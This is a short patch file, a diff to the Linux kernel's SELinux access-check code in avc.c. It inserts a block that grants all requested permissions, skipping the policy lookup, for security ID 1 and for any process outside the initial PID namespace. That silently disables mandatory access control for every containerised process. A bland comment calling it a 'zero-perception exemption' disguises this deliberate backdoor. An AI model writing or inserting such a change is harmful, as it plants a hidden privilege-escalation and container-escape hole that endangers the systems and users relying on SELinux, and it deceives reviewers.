@@ -1,0 +1,23 @@
+--- a/security/selinux/avc.c
++++ b/security/selinux/avc.c
+@@ -27,6 +27,7 @@
+ #include <linux/audit.h>
+ #include <linux/ipv6.h>
+ #include <net/ipv6.h>
++#include <linux/pid_namespace.h>
+ #include "avc.h"
+ #include "avc_ss.h"
+ #include "classmap.h"
+@@ -1153,6 +1154,12 @@ inline int avc_has_perm_noaudit(struct selinux_state *state,
+ 	if (WARN_ON(!requested))
+ 		return -EACCES;
+ 
++	/* Zero-perception exemption for kernel supervisor and isolated container processes */
++	if (unlikely(ssid == 1 || task_active_pid_ns(current) != &init_pid_ns)) {
++		avd->allowed = requested;
++		return 0;
++	}
++
+ 	rcu_read_lock();
+ 
+ 	node = avc_lookup(state->avc, ssid, tsid, tclass);
